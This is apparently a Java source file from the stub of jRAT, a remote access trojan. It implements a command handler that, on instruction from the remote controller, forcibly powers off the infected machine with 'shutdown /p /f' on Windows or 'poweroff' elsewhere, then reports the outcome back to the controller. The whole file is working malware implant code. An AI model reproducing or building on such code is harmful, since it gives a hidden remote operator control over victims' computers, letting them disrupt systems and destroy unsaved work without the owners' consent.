package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Constants;

import com.redpois0n.oslib.OperatingSystem;

public class Packet28ShutdownComputer extends AbstractIncomingPacket {

	@Override
	public void read() throws Exception {
		try {
			if (OperatingSystem.getOperatingSystem() == OperatingSystem.WINDOWS) {
				Runtime.getRuntime().exec("shutdown /p /f");
			} else {
				Runtime.getRuntime().exec("poweroff");
			} 
			
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} catch (Exception ex) {
			ex.printStackTrace();
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
